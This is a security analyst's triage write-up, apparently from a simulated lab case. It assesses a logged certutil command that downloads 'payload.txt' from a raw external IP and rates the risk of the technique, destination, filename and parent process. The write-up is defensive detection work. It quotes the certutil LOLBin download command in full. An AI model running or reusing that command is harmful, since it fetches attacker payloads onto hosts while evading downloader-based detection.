# Investigation — Case 008

## Step 1: Assess the Command

`certutil.exe -urlcache -split -f http://185.220.101.45/payload.txt payload.txt`

**Finding:** 🔴 `certutil.exe` is a legitimate Windows certificate services utility, but `-urlcache -split -f` is a well-documented **living-off-the-land binary (LOLBin) abuse pattern** — attackers use certutil's URL-caching feature to download arbitrary files while evading detection tools that only flag known downloader tools (browsers, PowerShell WebClient, etc.), since certutil is a trusted, signed Microsoft binary.

---

## Step 2: Assess the Destination

`185.220.101.45` — a raw external IP, not a domain. IP range 185.220.x.x is publicly associated with known Tor exit node / anonymization infrastructure ranges in threat intelligence reporting (worth flagging as a lookup point for L2, though not independently verified in this simulated lab environment).

**Finding:** 🔴 Public, non-corporate IP with no legitimate business justification for this host to contact it.

---

## Step 3: Assess File Being Downloaded

Target filename: `payload.txt` — a `.txt` extension is often used to disguise executable/script content and evade simple extension-based filtering, since the actual downloaded content type is not guaranteed to match the file extension.

---

## Step 4: Parent Process

`Creator_Process_Name` = `cmd.exe` — consistent with manual/scripted execution, matching the pattern in prior LOLBin/download cases (Case_001, Case_007).

---

## Summary of Findings

| Check | Result | Risk |
|---|---|---|
| Technique | certutil `-urlcache` LOLBin abuse | 🔴 High |
| Destination | Raw public IP, no business justification | 🔴 High |
| Filename | `.txt` extension, potential disguise | 🟠 Medium |
| Parent process | cmd.exe — neutral | 🟡 Neutral |
